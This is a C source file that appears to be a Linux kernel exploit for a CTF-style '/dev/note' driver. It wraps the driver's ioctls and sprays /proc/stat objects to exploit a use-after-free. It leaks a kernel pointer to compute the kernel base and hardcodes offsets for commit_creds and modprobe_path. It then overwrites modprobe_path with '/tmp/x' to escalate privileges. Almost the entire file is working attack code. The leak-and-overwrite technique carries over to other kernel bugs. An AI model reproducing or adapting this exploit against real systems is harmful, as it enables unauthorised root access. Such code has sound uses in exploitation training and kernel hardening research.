#define _GNU_SOURCE

#include <init.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sched.h>

enum {
    ADD = 0xC12ED001,
    DEL,
    EDIT,
    VIEW
};

#define DEVICE "/dev/note"

typedef struct request {
    u32 size;
    char *buf;
} request_t;

void view(char *buf, u32 size) {
    request_t req = {
        .buf = buf,
        .size = size
    };
    ioctl(g_fd, VIEW, &req);
}

void add(u32 size) {
    request_t req = {.size = size};
    ioctl(g_fd, ADD, &req);
}

void edit(char *buf, u32 size) {
    request_t req = {
        .buf = buf,
        .size = size
    };
    ioctl(g_fd, EDIT, &req);
}

void del() {
    request_t req = {
        .buf = 0,
        .size = 0
    };
    ioctl(g_fd, DEL, &req);
}

int main() {
    save_state();
    sleep(3);
    g_fd = open_dev(DEVICE, O_RDWR);

    int seq[10];
    for (int i = 0; i < 10; i++) {
        seq[i] = open_dev("/proc/stat", O_RDONLY);
    }

    char buf[0x20];
    add(0x20);

    memset(buf, 0x61, sizeof(buf));
    edit(buf, sizeof(buf));
    open_dev("/proc/stat", O_RDONLY);
    del();

    open_dev("/proc/stat", O_RDONLY);
    add(0x20);

    int victim_id = -1;
    for (int i = 0; i < 10; i++) {
        close(seq[i]);
        seq[i] = open_dev("/proc/stat", O_RDONLY);
        view(buf, 0x20);
    
        if ((*(u64*)buf & 0xfff) == 0xe60) {
            kbase = *(u64*)buf - 0x13be60;
            victim_id = i;
            break;
        }
    }
    commit_creds = 0x00069c10, prepare_kernel_cred = 0x00069e00, modprobe_path = 0x00c2c540, \
    swapgs_restore_regs_and_return_to_usermode = 0x00600a34;
    gadget();

    close(seq[victim_id]);
    *(u64*)buf = modprobe_path;
    edit(buf, 0x20);
    open_dev("/proc/stat", O_RDONLY);
    del();
    open_dev("/proc/stat", O_RDONLY);


    add(0x20);
    edit("/tmp/x", 7);
    for (int i = 0; i < 10; i++) { close(seq[i]); }
    modprobe_path_setup();
    getchar();
}